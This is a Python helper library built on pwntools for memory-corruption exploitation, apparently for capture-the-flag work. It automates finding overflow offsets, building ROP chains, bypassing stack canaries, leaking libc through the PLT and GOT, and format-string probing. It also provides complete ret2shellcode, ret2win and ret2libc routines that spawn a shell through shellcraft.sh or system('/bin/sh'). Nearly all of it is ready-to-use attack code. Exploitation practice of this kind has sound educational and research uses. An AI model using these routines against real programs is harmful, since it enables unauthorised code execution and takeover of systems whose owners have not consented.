from pwn import *

# Module-level variables that can be set by exploit scripts
conn = None
elf = None
libc = None
binary = None
prefix = None
offset = None
canary = None


def resolve(symbol, base=None):
    """Resolve a symbol to an address, with optional offset notation (e.g., 'main+0x10')"""
    if base is None:
        base = globals().get("elf")
    if isinstance(symbol, int):
        return symbol
    elif "+" in symbol:
        func, offset = symbol.split("+")
        addr = base.sym[func] + int(offset, 0)
    elif "-" in symbol:
        func, offset = symbol.split("-")
        addr = base.sym[func] - int(offset, 0)
    else:
        addr = base.sym[symbol]
    return addr


def check_leaks(leak, conn=None, elf=None, libc=None):
    """Check if leaked addresses match actual addresses"""
    conn = conn or globals().get("conn")
    elf = elf or globals().get("elf")
    libc = libc or globals().get("libc")

    names = ["elf", "libc", "stack", "heap"]
    leaks = [
        elf.address if elf else None,
        libc.address if libc else None,
        globals().get("stack"),
        globals().get("heap"),
    ]
    for name, leak in zip(names, leaks):
        if not leak:
            continue
        real = getattr(conn, f"{name}_mapping")().address
        if leak != real:
            log.info(
                f"{name} : leak = {leak:#x}, real = {real:#x}, diff = {leak - real:#x}"
            )


def ropchain(chain, ret=True, elf=None, libc=None):
    """Build a ROP chain from a dictionary of {function: [args]}"""
    elf = elf or globals().get("elf")
    libc = libc or globals().get("libc")

    elfs = []
    if elf and (not elf.pie or elf.address):
        elfs.append(elf)
    if libc and (not libc.aslr or libc.address):
        elfs.append(libc)
    rop = ROP(elfs)
    if elfs and ret:
        rop.raw(rop.ret.address)
    for func, params in chain.items():
        rop.call(func, params)
    log.info(f"ROP :\n{rop.dump()}")
    return rop.chain()


def find_offset(data=cyclic(1000)):
    global conn, offset
    context.delete_corefiles = True
    conn = process(binary)
    send(data)
    conn.wait()
    core = conn.corefile
    offset = cyclic_find(core.fault_addr)
    conn.close()
    del conn
    log.info(f"{offset = }")


def bof(data, **kwargs):
    if not "offset" in globals():
        find_offset()
    if not "conn" in globals():
        start()
    opt = kwargs.pop("opt", {})
    bp = kwargs.pop("bp", 0)
    opt |= {offset - context.bytes: bp}
    if elf.canary:
        opt |= {offset - context.bytes * 2: canary}
    payload = flat({offset: data} | opt, **kwargs)
    send(payload)


def ret2shellcode(addr, **kwargs):
    shellcode = asm(shellcraft.sh())
    if context.bits == 32:
        shellcode = asm("sub esp, 0x1000") + shellcode
    else:
        shellcode = asm("sub rsp, 0x1000") + shellcode
    padding = asm("nop") * (offset - context.bytes * (elf.canary + 1) - len(shellcode))
    addr += len(padding) // 2
    payload = ropchain({addr: []})
    bof(payload, opt={0: [padding, shellcode]}, **kwargs)


def ret2win(win, params=[], **kwargs):
    addr = resolve(win)
    payload = ropchain({addr: params})
    bof(payload, **kwargs)


def ret2libc(**kwargs):
    system = libc.sym["system"]
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    payload = ropchain({system: [bin_sh]})
    bof(payload, **kwargs)


def ret2plt(func="puts", ret2main="main", **kwargs):
    func_plt = elf.plt[func]
    func_got = elf.got[func]
    if ret2main:
        main = resolve(ret2main)
        payload = ropchain({func_plt: [func_got], main: []})
    else:
        payload = ropchain({func_plt: [func_got]})
    bof(payload, **kwargs)
    leak = upack(rl())
    libc.address = leak - libc.sym[func]


def format_string(n=100):
    payload = "A" * context.bytes + ".%p" * n
    send(payload)
    output = rec().split(".")
    log.info(f"format string : {output}")
    return output.index("0x" + "41" * context.bytes)


def send(data, conn=None, delim=None):
    """Send data, automatically encoding strings and using sendlineafter"""
    conn = conn or globals().get("conn")
    if conn is None:
        raise ValueError(
            "No connection available. Either pass conn=io parameter or set global conn variable."
        )
    delim = delim or globals().get("prefix", "")
    if isinstance(data, str):
        data = data.encode()
    if delim:
        return conn.sendlineafter(
            delim.encode() if isinstance(delim, str) else delim, data
        )
    else:
        return conn.sendline(data)


def rec(conn=None):
    """Receive a line and decode it"""
    conn = conn or globals().get("conn")
    if conn is None:
        raise ValueError(
            "No connection available. Either pass conn=io parameter or set global conn variable."
        )
    return conn.recvline(False).decode()


# Shorthand functions - can use global 'conn' or pass it explicitly
def s(data, conn=None, **kwargs):
    """Send data"""
    conn = conn or globals().get("conn")
    if conn is None:
        raise ValueError(
            "No connection available. Either pass conn=io parameter or set global conn variable."
        )
    return conn.send(data, **kwargs)


def sa(data, delim=None, conn=None, **kwargs):
    """Send data after delimiter"""
    conn = conn or globals().get("conn")
    if conn is None:
        raise ValueError(
            "No connection available. Either pass conn=io parameter or set global conn variable."
        )
    delim = delim or globals().get("prefix", "")
    return conn.sendafter(
        delim.encode() if isinstance(delim, str) else delim, data, **kwargs
    )


def sl(data, conn=None, **kwargs):
    """Send line"""
    conn = conn or globals().get("conn")
    if conn is None:
        raise ValueError(
            "No connection available. Either pass conn=io parameter or set global conn variable."
        )
    return conn.sendline(data, **kwargs)


def sla(data, delim=None, conn=None, **kwargs):
    """Send line after delimiter"""
    conn = conn or globals().get("conn")
    if conn is None:
        raise ValueError(
            "No connection available. Either pass conn=io parameter or set global conn variable."
        )
    delim = delim or globals().get("prefix", "")
    return conn.sendlineafter(
        delim.encode() if isinstance(delim, str) else delim, data, **kwargs
    )


def rn(n, conn=None, **kwargs):
    """Receive n bytes"""
    conn = conn or globals().get("conn")
    if conn is None:
        raise ValueError(
            "No connection available. Either pass conn=io parameter or set global conn variable."
        )
    return conn.recvn(n, **kwargs)


def rl(conn=None, **kwargs):
    """Receive line"""
    conn = conn or globals().get("conn")
    if conn is None:
        raise ValueError(
            "No connection available. Either pass conn=io parameter or set global conn variable."
        )
    return conn.recvline(drop=False, **kwargs)


def rln(n, conn=None, **kwargs):
    """Receive n lines"""
    conn = conn or globals().get("conn")
    if conn is None:
        raise ValueError(
            "No connection available. Either pass conn=io parameter or set global conn variable."
        )
    return conn.recvlines(n, False, **kwargs)


def ru(delim, conn=None, **kwargs):
    """Receive until delimiter"""
    conn = conn or globals().get("conn")
    if conn is None:
        raise ValueError(
            "No connection available. Either pass conn=io parameter or set global conn variable."
        )
    return conn.recvuntil(delim.encode() if isinstance(delim, str) else delim, **kwargs)


def ra(conn=None, **kwargs):
    """Receive all"""
    conn = conn or globals().get("conn")
    if conn is None:
        raise ValueError(
            "No connection available. Either pass conn=io parameter or set global conn variable."
        )
    return conn.recvall(1, **kwargs)


def upack(data, **kwargs):
    """Unpack data to integer"""
    return unpack(data, "all", **kwargs)
